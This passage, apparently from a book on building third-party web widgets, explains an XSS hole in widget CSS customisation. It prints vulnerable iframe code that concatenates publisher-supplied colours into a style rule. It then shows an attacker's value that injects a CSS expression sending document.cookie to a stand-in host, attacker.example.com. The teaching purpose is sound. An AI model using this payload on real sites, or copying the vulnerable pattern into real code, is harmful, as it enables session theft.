## XSS CSS

## **7.2.2 XSS vulnerabilities in CSS**

Another example of a successful XSS attack would be an attack on your widget’s CSS

customization rules. Sometimes, when you want to make your widget more configu-
rable, you allow publishers to specify custom styles to apply to your widget, even com-
ponents that are served behind an iframe. You learned about this technique in

chapter 3 where we covered adaptive HTML and CSS.
Take a look at listing 7.1. Here, the publisher is including the Camera Stork widget

on their web page. Additionally, they’re specifying two custom colors using global vari-
ables: stork_bg_color, which contains a background color, and stork_fg_color, the

foreground (text) color.

**Listing 7.1 A publisher specifies two custom colors using global configuration variables**

<script>
var stork_bg_color = '#000';
var stork_fg_color = '#fff';
(function() {
var script = document.createElement('script');
script.async = true;
script.src = 'http://camerastork.com/widget.js?product=1234';
var entry = document.getElementsByTagName('script')[0];
entry.parentNode.insertBefore(script, entry);
})();
</script>

Suppose that this version of the Camera Stork widget generates its markup behind an
external iframe. Listing 7.2 shows the code for generating the iframe HTML. It
extracts the custom color arguments from the iframe URL’s query string,5

and injects

them into the page.

**Listing 7.2 Vulnerable code that injects publisher-specified color settings**

<!DOCTYPE html>
<html>
<head>
<script src="/js/helpers.js"></script>
</head>
<body>
<script>
var args = parseQueryArguments(window.location.search);
Listing 7.1 A publisher specifies two custom colors using global configuration variables

5 The color parameters could alternatively be passed to the iframe using the URL document fragment (#) or a
window messaging API like window.postMessage.

var rules = [];
if (args.bg) {
rules.push('body { background-color: ' + args.bg + '; }');
})
if (args.fc) {
rules.push('body { color: ' + args.fc + '; }');
}
var css = rules.join('\n');
var style;
if (rules.length) {
style = document.createElement('style');
style.type = 'text/css';
style.appendChild(document.createTextNode(css));
document.head.appendChild(style);
}
</script>

<!-- The rest of the iframe body -->
</body>
</html>
Now assume that the attacker installs your widget on their own website and, instead of
specifying a background color value, puts the following code inside the
stork_bg_color variable:
var stork_bg_color = '#000;x:expression(var i = new Image;' +
'i.src="http://attacker.example.com/?c=" + document.cookie);';
When executed, this code will close the background-color CSS rule and declare an
additional, malicious, CSS expression. This expression executes what should be a
familiar piece of JavaScript code—code that sends the user’s current session identifier
to the attacker’s website using a hidden Image object. Now, the attacker simply needs
to lure one of your users to a page hosting the exploited widget6

and the damage is
done—the attacker has received the contents of the user’s cookie and has stolen their
session. Because the attacking code is executed inside an iframe hosted on your
domain, the malicious code will have access to all cookies from your domain, even
though they’re not accessible from outside the iframe.
BEWARE UNTRUSTED PUBLISHERS Not everyone who installs your application
does so because they actually intend to use it. Some people will install your
application to establish themselves as an entry point for an attack on your
users and—as you’ll learn later in this chapter—even other publishers. You

should consider input values from publishers to be just as potentially danger-
ous as those from regular users.

6 This can be as simple as sending an email with a link to the exploited page to an unsuspecting victim.

This CSS expression example only works in Internet Explorer, but it’s one of many XSS
entry points available to an experienced attacker. Alternatively, the attacker could
close the <style> tag in listing 7.2 and start injecting arbitrary code into your iframe’s

<head> section. Other exploits include putting javascript:<expr> as a URL for an
image, putting a JavaScript exception inside of a refresh meta tag in Firefox, and so
on. For an excellent list of possible XSS entry points, you can refer to the XSS Cheat
Sheet located at http://ha.ckers.org/xss.html.
Now that you’ve learned about different ways your web application can be—will
be—attacked, it’s probably useful if we show you a few ways to defend your application
against XSS attacks.

---

#### From [[_2_cross-site-scripting]]

[//begin]: # "Autogenerated link references for markdown compatibility"
[_2_cross-site-scripting]: _2_cross-site-scripting "Cross-Site Scripting"
[//end]: # "Autogenerated link references"
